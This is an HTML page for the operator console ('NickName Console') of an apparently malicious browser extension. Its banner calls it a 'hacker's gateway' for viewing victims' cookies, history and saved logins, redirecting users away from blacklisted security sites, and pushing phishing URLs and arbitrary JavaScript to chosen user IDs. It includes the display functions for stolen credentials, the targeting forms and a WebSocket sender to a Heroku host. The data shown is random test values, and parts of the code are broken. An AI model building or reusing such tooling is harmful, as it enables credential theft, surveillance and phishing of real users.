<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SpeedDemon</title>
    <link rel="stylesheet" href="bootstrap-4.0.0-dist/css/bootstrap.min.css"> 
	<script src="bootstrap-4.0.0-dist/js/bootstrap.min.js"></script>
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
  	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
  	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
  	<link href="style.css" rel="stylesheet">
  </head>

  

  <body data-spy = "scroll" data-target=".navbar">

	<nav class="navbar navbar-expand-sm bg-dark navbar-dark fixed-top">
		<a class="navbar-brand" href="#">NickName123</a>
		<ul class = "navbar-nav">
			<li class="nav-item">
				<a class="nav-link" href="#userSection">Users</a>
			</li>
			<li class = "nav-item">
				<a class="nav-link" href="#blackListSection">Blacklist</a>
			</li>
		</ul>
	</nav>

	<div class = "jumbotron">
		<h1 class = "display-4">NickName Console</h1>
		<p class = "lead">
			This website is the hacker's gateway to the NickName extension. This interface will allow you to access user cookies and history, create a black list of security sites to redirect users from, and launch targeted phishing and other such scripts at users. Happy hacking!
		</p>
		<hr class="my-4">
		<p>Note: We are not responsible for any privacy breaches, as all permissions have been given by users of our application to access their data.</p>
	</div>  

	<div id = "userSection">
	
		<div class="container-fluid">
			<h3>All Users</h3>

			<div id="accordion">
				<div id="infoCard" class="card">
					<div id="infoCardHeader" class="card-header">
						<a id="infoCardLink" class="card-link" data-toggle="collapse" href="#infoCardCollapse">Info
						</a>
					</div>
					<div id="infoCardCollapse" class="collapse" data-parent="#accordion">
						<div id="infoCardBody" class="card-body">Click an ID to view its cookies, login details. and history.
						</div>
					</div>
				</div>
	

				<!-- Add Accordion Cards -->
				<script>
					window.userCount = -1;   // Declare a global variable
			        //This global var is used to give each new user card added a different id

   					function makeCard(id, status) {
   						userCount++;
	        			
						var cardInfo = document.getElementById("infoCard");
						var card = cardInfo.cloneNode(true);
						//Clones info card to be turned into a user card
						card.id = userCount; //gives card a unique id

						var header = card.children[0];
						var link = header.children[0];
						var statusString = "	" + status;
						link.innerHTML = id + statusString;
						link.id = "link" + userCount; //prepends "link" to id so it's diff than card id

						link.href = "#collapse" + userCount;
						//href can't begin with a number 

						var collapse = card.children[1];
						collapse.id = "collapse" + userCount;

						console.log(link.href);
						console.log(collapse.id);

						var body = collapse.children[0];
						body.id = "body" + id;
						body.innerHTML = "";
						//body will be filled in by other functions

						//add new card to accordion
						var addTo = document.getElementById("accordion");
						addTo.appendChild(card);
   					}
   				</script>


				<script>
					//Testing makeCard
					var rand1 = Math.floor((Math.random() * 10000) + 1);
					rand1 = rand1.toString();
					var rand2 = Math.floor((Math.random() * 10000) + 1);
					rand2 = rand2.toString();
					var rand3 = Math.floor((Math.random() * 10000) + 1);
					rand3 = rand3.toString();

					var idArray = [rand1, rand2, rand3];

					for (var i = 0; i < idArray.length; i++) {
						makeCard(idArray[i], "Offline");
					}
				</script>
		
				

   				

				<!-- Add User Info -->
				<script>
					//this script is for testing purposes
					var r1 = Math.floor((Math.random() * 10000) + 1);
					var r2 = Math.floor((Math.random() * 10000) + 1);
					var r3 = Math.floor((Math.random() * 10000) + 1);

					var historyArray = [r1, r2, r3];

					var r1 = Math.floor((Math.random() * 10000) + 1);
					var r2 = Math.floor((Math.random() * 10000) + 1);
					var r3 = Math.floor((Math.random() * 10000) + 1);

					var nameArray = [r1, r2, r3];

					var r1 = Math.floor((Math.random() * 10000) + 1);
					var r2 = Math.floor((Math.random() * 10000) + 1);
					var r3 = Math.floor((Math.random() * 10000) + 1);

					var domainArray = [r1, r2, r3];

					var r1 = Math.floor((Math.random() * 10000) + 1);
					var r2 = Math.floor((Math.random() * 10000) + 1);
					var r3 = Math.floor((Math.random() * 10000) + 1);

					var valueArray = [r1, r2, r3];

					var r1 = Math.floor((Math.random() * 10000) + 1);
					var r2 = Math.floor((Math.random() * 10000) + 1);
					var r3 = Math.floor((Math.random() * 10000) + 1);

					var urlArray = [r1, r2, r3];

					var r1 = Math.floor((Math.random() * 10000) + 1);
					var r2 = Math.floor((Math.random() * 10000) + 1);
					var r3 = Math.floor((Math.random() * 10000) + 1);

					var usernameArray = [r1, r2, r3];

					var r1 = Math.floor((Math.random() * 10000) + 1);
					var r2 = Math.floor((Math.random() * 10000) + 1);
					var r3 = Math.floor((Math.random() * 10000) + 1);

					var passwordArray = [r1, r2, r3];



				</script>
				<button type="button" class="btn btn-outline-secondary btn-lg" onclick="fillHistory(rand1, historyArray)">Test fillHistory</button>
				<button type="button" class="btn btn-outline-secondary btn-lg" onclick="fillCookies(rand2, nameArray, domainArray, valueArray)">Test fillCookies</button>
				<button type="button" class="btn btn-outline-secondary btn-lg" onclick="fillLogins(rand3, urlArray, usernameArray, passwordArray)">Test fillLogins</button>

				<script>
					function fillHistory(id, historyArray){
						id = "body" + id;
						//body of cards have id "body0", "body1", "body2", ...

						var table = document.createElement("table");
						/*var header = table.createTHead();
						var row = header.insertRow(0);
						var cell = row.insertCell(0);
						cell.innerHTML = "<b>History</b>";*/

						for (var i = 0; i < historyArray.length; i++) {
							var aRow = document.createElement('tr');
							var aCol = document.createTextNode(historyArray[i]);
							table.appendChild(aRow);
							aRow.appendChild(aCol);
						}

						var addTo = document.getElementById(id);
						addTo.appendChild(table);

					}
				</script>

				<script>
					function fillCookies(id, nameArray, domainArray, valueArray){
						id = "body" + id;
						//body of cards have id "body0", "body1", "body2", ...

						var table = document.createElement("table");

						var bigRow = document.createElement("tr");
						cell1 = bigRow.insertCell(0);
						cell2 = bigRow.insertCell(1);
						cell2.innerHTML = "SPACE";
						cell3 = bigRow.insertCell(2);
						cell4 = bigRow.insertCell(3);
						cell4.innerHTML = "SPACE";
						cell5 = bigRow.insertCell(4);

						for (var i = 0; i < nameArray.length; i++) {
							var aRow = document.createElement('tr');
							cell1.appendChild(aRow);
							var aCol = document.createElement('td');
							aCol.innerHTML = nameArray[i];
							aRow.appendChild(aCol);
						}
						var aRow = document.createElement('tr');
						bigRow.appendChild(aRow);
						for (var i = 0; i < domainArray.length; i++) {
							var aRow = document.createElement('tr');
							cell3.appendChild(aRow);
							var aCol = document.createElement('td');
							aCol.innerHTML = domainArray[i];
							aRow.appendChild(aCol);
						}
						var aRow = document.createElement('tr');
						bigRow.appendChild(aRow);
						for (var i = 0; i < valueArray.length; i++) {
							var aRow = document.createElement('tr');
							cell5.appendChild(aRow);
							var aCol = document.createElement('td');
							aCol.innerHTML = valueArray[i];
							aRow.appendChild(aCol);
						}

						var addTo = document.getElementById(id);
						addTo.appendChild(bigRow);
					}
				</script>


				<script>
					function fillLogins(id, urlArray, usernameArray, passwordArray){
						id = "body" + id;
						//body of cards have id "body0", "body1", "body2", ...

						var bigRow = document.createElement("tr");
						cell1 = bigRow.insertCell(0);
						cell2 = bigRow.insertCell(1);
						cell2.innerHTML = "SPACE";
						cell3 = bigRow.insertCell(2);
						cell4 = bigRow.insertCell(3);
						cell4.innerHTML = "SPACE";
						cell5 = bigRow.insertCell(4);

						for (var i = 0; i < nameArray.length; i++) {
							var aRow = document.createElement('tr');
							cell1.appendChild(aRow);
							var aCol = document.createElement('td');
							aCol.innerHTML = urlArray[i];
							aRow.appendChild(aCol);
						}
						for (var i = 0; i < domainArray.length; i++) {
							var aRow = document.createElement('tr');
							cell3.appendChild(aRow);
							var aCol = document.createElement('td');
							aCol.innerHTML = usernameArray[i];
							aRow.appendChild(aCol);
						}
						for (var i = 0; i < valueArray.length; i++) {
							var aRow = document.createElement('tr');
							cell5.appendChild(aRow);
							var aCol = document.createElement('td');
							aCol.innerHTML = passwordArray[i];
							aRow.appendChild(aCol);
						}

						var addTo = document.getElementById(id);
						addTo.appendChild(bigRow);
					}
				</script>


			</div>
		</div>


	</div>	

	<br><hr class="body"><br>

	<div class = "ml-3">



	<!-- Phishing and JSexe -->

	<!-- Add Phishing -->
    <form name="phishingForm" onsubmit "return phish()">
        <h4>Add phishing script:</h4>
        <br>
        <input type = "text" name = "Phishing_ID" placeholder = "User ID"><br>
        <!-- <input type = "text" name = "Phishing_Script" placeholder = "Script"><br> -->
        <input type = "text" name = "Phishing_URL" placeholder = "URL"><br>
        <input type = "submit" name = "Submit_Phishing_Script" class="btn btn-primary">
    </form>

    <br>

    <!-- Add Javascript -->
    <form name="jsForm" onsubmit "return js()">
        <h4>Add javascript execution script:</h4>
        <br>
        <input type = "text" name = "JS_ID" placeholder = "User ID"><br>
        <input type = "text" name = "JS_Script" placeholder = "Script"><br>
        <input type = "text" name = "JS_URL" placeholder = "URL"><br>
        <input type = "submit" name = "Submit_JS_Script" class="btn btn-primary">
    </form>


    <br><hr class="body"><br>


	<!-- Black List Sites -->
	<div id = "blackListSection">
	<h4>Add Site to Blacklist Here</h4>
	<input type="text" class="form-control blacklist" placeholder="URL">
	<button class="btn btn-primary" type="button" onclick="blackList()">Add Site</button>

	<br><br><br>

	<h4>Blacklisted Sites</h4>
	<ul class = "list-group">
		<li class="list-group-item">securitee.org</li>
	</ul>

	<script>
	    function blackList(){
	        var URL = document.getElementById(text);
	        var HOST = 'wss://projectnickname123.herokuapp.com';
	        var ws = new WebSocket(HOST);
	        var jsonPackage = {id: 0, type:'list', addString: URL};
	        ws.send(JSON.stringify(jsonPackage));
	    }
		window.addEventListener("hashchange", function() { scrollBy(0, -70) });
	</script>






	<script>
		var jsonPackage = {type: statusRequest};
		ws.send(JSON.stringify(jsonPackage));
		ws.onmessage = function(e){
			if(e.type == "status"){
				object = JSON.parse(e.data);
				var ids = object.ids;
				var statusArray = object.statuses;
				var table = document.getElementById(statusTable);
				for(i = 0; i < ids.length; i++){
					var aRow = document.createElement('tr');
					var idCol = document.createTextNode(ids[i]);
					var statusCol = document.createTextNode(statusArray[i]);
					idCol.setAttribute('href', "infoPage.html");
					table.appendChild(aRow);
					aRow.appendChild(idCol);
					aRow.appendChild(statusCol);
				}
			}	
		}
	</script>
	
	</div>
	</div>
	</div>


	<br><br><br><br><br><br><br><br>


  </body>

</html>
